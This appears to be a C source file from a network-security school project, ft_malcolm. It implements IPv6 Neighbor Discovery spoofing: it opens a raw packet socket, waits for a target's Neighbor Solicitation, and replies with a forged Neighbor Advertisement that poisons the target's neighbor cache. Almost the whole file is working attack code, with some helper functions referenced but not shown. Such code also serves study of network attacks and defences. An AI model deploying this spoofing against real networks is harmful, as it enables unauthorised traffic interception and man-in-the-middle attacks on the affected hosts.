#include "ft_malcolm.h"

int setup_ndp_socket(void)
{
	int sockfd;

	sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
	if (sockfd < 0)
	{
		perror("socket");
		return (-1);
	}
	return (sockfd);
}

static int filter_ns(uint8_t *buffer, t_addrs *addrs)
{
	struct ipv6_header *ip6;
	struct icmpv6_ns   *ns;

	ip6 = (struct ipv6_header *)(buffer + ETH_HEADER_SIZE);
	ns  = (struct icmpv6_ns *)(buffer + ETH_HEADER_SIZE + sizeof(struct ipv6_header));
	if (ip6->next_header != 58)
		return (0);
	if (ns->type != 135)
		return (0);
	if (memcmp(ns->target, addrs->source_ipv6, 16) != 0)
		return (0);
	if (memcmp(ip6->src, addrs->target_ipv6, 16) != 0)
		return (0);
	return (1);
}

int receive_ns(int sockfd, uint8_t *buffer, t_addrs *addrs)
{
	while (1)
	{
		if (recvfrom(sockfd, buffer, NS_BUFFER_SIZE, 0, NULL, NULL) < 0)
		{
			perror("recvfrom");
			return (0);
		}
		if (filter_ns(buffer, addrs))
			return (1);
	}
}

int send_na(int sockfd, uint8_t *reply, uint8_t *target_mac, int ifindex)
{
	struct sockaddr_ll dest;

	memset(&dest, 0, sizeof(dest));
	dest.sll_ifindex = ifindex;
	dest.sll_family  = AF_PACKET;
	dest.sll_halen   = 6;
	memcpy(dest.sll_addr, target_mac, 6);
	if (sendto(sockfd, reply, NA_FRAME_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
	{
		perror("sendto");
		return (0);
	}
	printf("Sent a Neighbor Advertisement, you may now check the neighbor cache on the target.\n");
	return (1);
}

int run_ndp_spoof(t_addrs *addrs, int verbose)
{
	int     ifindex;
	uint8_t buffer[NS_BUFFER_SIZE];
	uint8_t reply[NA_FRAME_SIZE];

	g_sockfd = setup_ndp_socket();
	if (g_sockfd < 0)
		return (0);
	ifindex = get_interface(g_sockfd, ETH_P_IPV6);
	if (ifindex < 0)
		return (0);
	if (!receive_ns(g_sockfd, buffer, addrs))
		return (0);
	log_ns_received(buffer);
	printf("Now sending a Neighbor Advertisement with spoofed source, please wait...\n");
	if (verbose)
		print_ndp_verbose(buffer, addrs);
	build_na(reply, addrs);
	return (send_na(g_sockfd, reply, addrs->target_mac, ifindex));
}
